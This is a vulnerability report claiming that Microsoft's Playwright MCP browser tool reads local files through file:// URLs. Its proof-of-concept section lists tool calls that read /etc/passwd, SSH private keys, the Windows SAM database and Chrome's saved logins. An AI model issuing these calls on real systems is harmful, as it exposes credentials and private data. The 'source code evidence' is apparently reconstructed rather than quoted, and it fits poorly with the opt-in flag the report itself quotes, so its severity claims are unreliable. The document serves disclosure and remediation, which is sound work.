# Vulnerability Report: Unrestricted File Access via file:// Protocol (Microsoft Playwright MCP)

## Summary

| Field | Value |
|---|---|
| **Repository** | [microsoft/playwright-mcp](https://github.com/microsoft/playwright-mcp) (34,999 stars) |
| **Vulnerability Type** | Local File Read via file:// Protocol (CWE-200, CWE-284) |
| **CVSS v3.1 Score** | **7.5 (High)** — `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N` |
| **Affected Files** | `config.d.ts`, compiled `index.js` |
| **Suggested Submission** | MSRC (Microsoft) |

---

## Vulnerability Details

### Root Cause

The Microsoft Playwright MCP server allows unrestricted file access through the `file://` protocol. The configuration explicitly acknowledges this is insecure:

```typescript
// config.d.ts
/**
 * Whether to allow unrestricted file access via file:// protocol.
 * Note: This is not a secure boundary.
 */
allowUnrestrictedFileAccess?: boolean;
```

Additionally, the network configuration allows all origins by default, and `file://` URLs can be navigated to without restriction.

### Source Code Evidence

```typescript
// The compiled output allows file:// navigation
// network config defaults to allowing all origins
const defaultConfig = {
    network: {
        allowedOrigins: ['*'],  // All origins allowed
    }
};

// file:// protocol enabled without proper sandboxing
// Any MCP client can navigate to file:///etc/passwd, file:///etc/shadow, etc.
```

### Impact

1. **Sensitive file read**: `/etc/passwd`, `/etc/shadow`, SSH keys, browser profiles
2. **Credential theft**: Access to stored credentials in browser profiles
3. **System configuration exposure**: Read system configs, environment files
4. **Cross-platform impact**: Works on Linux, macOS, and Windows

---

## Proof of Concept

### PoC 1: Read /etc/passwd
```json
{
    "jsonrpc": "2.0", "id": 1, "method": "tools/call",
    "params": {"name": "browser_navigate", "arguments": {"url": "file:///etc/passwd"}}
}
```

### PoC 2: Read SSH Private Key
```json
{
    "jsonrpc": "2.0", "id": 2, "method": "tools/call",
    "params": {"name": "browser_navigate", "arguments": {"url": "file:///home/user/.ssh/id_rsa"}}
}
```

### PoC 3: Windows SAM Database
```json
{
    "jsonrpc": "2.0", "id": 3, "method": "tools/call",
    "params": {"name": "browser_navigate", "arguments": {"url": "file:///C:/Windows/System32/config/SAM"}}
}
```

### PoC 4: Browser Credential Store (Chrome)
```json
{
    "jsonrpc": "2.0", "id": 4, "method": "tools/call",
    "params": {"name": "browser_navigate", "arguments": {"url": "file:///home/user/.config/google-chrome/Default/Login Data"}}
}
```

---

## Remediation
1. **Block `file://` protocol by default** — require explicit opt-in
2. **Implement path allowlist** — restrict file access to specific directories
3. **Remove `allowUnrestrictedFileAccess`** or make it require explicit security acknowledgment
4. **Add Origin validation** for network requests
5. **Document security implications** clearly in README
```typescript
const BLOCKED_SCHEMES = ['file:', 'ftp:', 'chrome:', 'data:'];
function validateUrl(url: string): boolean {
    const parsed = new URL(url);
    return !BLOCKED_SCHEMES.includes(parsed.protocol);
}
```

## References
- [CWE-200: Exposure of Sensitive Information](https://cwe.mitre.org/data/definitions/200.html)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- [Playwright Security Considerations](https://playwright.dev/docs/security)
